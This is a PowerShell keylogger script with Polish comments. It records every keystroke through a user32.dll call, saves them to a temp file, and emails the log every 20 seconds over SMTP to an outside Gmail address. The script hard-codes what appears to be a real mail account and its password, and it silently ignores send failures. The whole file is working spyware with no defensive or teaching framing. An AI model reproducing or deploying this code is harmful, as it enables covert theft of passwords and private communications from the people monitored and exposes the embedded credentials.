# Konfiguracja maila WP.PL
$smtpServer = "smtp.wp.pl"
$smtpFrom = "rarrak873@wp.pl"
$smtpTo = "przemekparuwa@gmail.com"
$subject = "Keylogger Report"
$username = "rarrak873@wp.pl"
$password = ",AixNM+Hg6!US&g"  # <-- Twoje hasło
$logFile = "$env:TEMP\kluczlog.txt"

# Tworzenie pustego pliku logów
New-Item -Path $logFile -ItemType File -Force | Out-Null

# Dodanie typu do użycia user32.dll
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class Keyboard {
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

# Timer do wysyłania maila co 20 sekund
$timer = New-Object Timers.Timer
$timer.Interval = 20000
$timer.AutoReset = $true
$timer.add_Elapsed({
    if (Test-Path $logFile) {
        $body = Get-Content $logFile -Raw
        if ($body -ne "") {
            $smtp = New-Object Net.Mail.SmtpClient($smtpServer, 465)
            $smtp.EnableSsl = $true
            $smtp.Credentials = New-Object System.Net.NetworkCredential($username, $password)
            try {
                $smtp.Send($smtpFrom, $smtpTo, $subject, $body)
                Clear-Content -Path $logFile
            } catch {
                # Jeśli wysyłka się nie uda — nic nie rób.
            }
        }
    }
})
$timer.Start()

# Nasłuchiwanie w tle
while ($true) {
    Start-Sleep -Milliseconds 100
    foreach ($key in [Enum]::GetValues([System.Windows.Forms.Keys])) {
        if ([Keyboard]::GetAsyncKeyState([int]$key) -ne 0) {
            $keyName = $key.ToString()
            Add-Content -Path $logFile -Value $keyName
        }
    }
}
